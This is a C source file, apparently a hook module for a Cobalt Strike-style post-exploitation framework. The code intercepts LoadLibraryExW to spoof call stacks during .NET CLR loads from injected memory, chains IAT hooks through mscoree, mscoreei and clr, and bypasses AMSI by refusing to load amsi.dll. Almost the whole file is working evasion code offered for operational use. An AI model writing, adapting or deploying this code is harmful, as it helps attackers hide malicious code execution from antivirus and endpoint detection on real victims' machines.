/*
 * LoadLibraryExW CLR Hook — Postex Image Load Stealth + AMSI Bypass
 *
 * The powerpick, psinject, and execute-assembly commands all load the
 * .NET CLR, which loads mscoree.dll -> mscoreei.dll -> clr.dll.
 * Because these loads originate from unbacked memory, the resulting
 * image loads inherit an unbacked call stack.
 *
 * This hook:
 *   1. Proxies LoadLibraryExW through spoof_call
 *   2. IAT-hooks LoadLibraryExW in each CLR module as it loads
 *   3. Refuses to load amsi.dll (AMSI bypass without memory patching)
 *
 * Register in spec file:
 *   addhook "KERNEL32$LoadLibraryExW" "_LoadLibraryExW"
 */

#include <windows.h>

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExW(LPCWSTR, HANDLE, DWORD);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);

void iat_hook(HMODULE mod, LPCSTR dll, LPCSTR func, PVOID hook);

HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags) {
    LPCWSTR name = wcsrchr(lpLibFileName, L'\\');
    name = (name != NULL) ? name + 1 : lpLibFileName;

    /* AMSI bypass: refuse to load amsi.dll entirely */
    if (MSVCRT$_wcsicmp(name, L"amsi.dll") == 0) {
        return NULL;                        /* AMSI never loads */
    }

    /* Proxy the real load through spoofed call stack */
    FUNCTION_CALL call = {0};
    call.ptr  = KERNEL32$LoadLibraryExW;
    call.argc = 3;
    call.args[0] = spoof_arg(lpLibFileName);
    call.args[1] = spoof_arg(hFile);
    call.args[2] = spoof_arg(dwFlags);

    HMODULE mod = (HMODULE)spoof_call(&call);
    if (mod == NULL) return NULL;

    /* Chain IAT hooks through CLR modules so subsequent loads also get spoofed */
    if (MSVCRT$_wcsicmp(name, L"mscoree.dll")   == 0 ||
        MSVCRT$_wcsicmp(name, L"mscoreei.dll")  == 0 ||
        MSVCRT$_wcsicmp(name, L"clr.dll")       == 0) {
        iat_hook(mod, "KERNEL32.dll", "LoadLibraryExW", (PVOID)_LoadLibraryExW);
    }
    return mod;
}
